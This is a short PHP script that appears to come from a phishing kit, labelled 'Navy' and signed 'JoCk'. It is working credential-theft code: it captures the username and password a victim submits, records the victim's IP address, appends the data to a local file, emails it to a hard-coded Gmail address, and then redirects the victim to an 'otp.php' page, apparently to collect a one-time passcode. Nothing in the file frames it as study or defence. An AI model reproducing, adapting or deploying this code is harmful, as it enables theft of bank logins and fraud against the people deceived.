<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "|----------| RESULT Navy By JoCk |--------------|\n";
$message .= "|Online ID : ".$_POST['username']."\n";
$message .= "|Password : ".$_POST['password']."\n";
$message .= "|----------| I N F O S |--------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|----------| YOUR WELCOME By JoCk|--------------|\n";
$send = "patrickfoong28@gmail.com";
$subject = "Log Navy By JoCk- From:  [ $ip ]";
$file = fopen("./cool.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message); 
{
mail("$send", "$subject", $message);
}
$praga=rand();
$praga=md5($praga);
	
		

	 	   header("Location: otp.php?session_id=$praga$praga");
 ?>





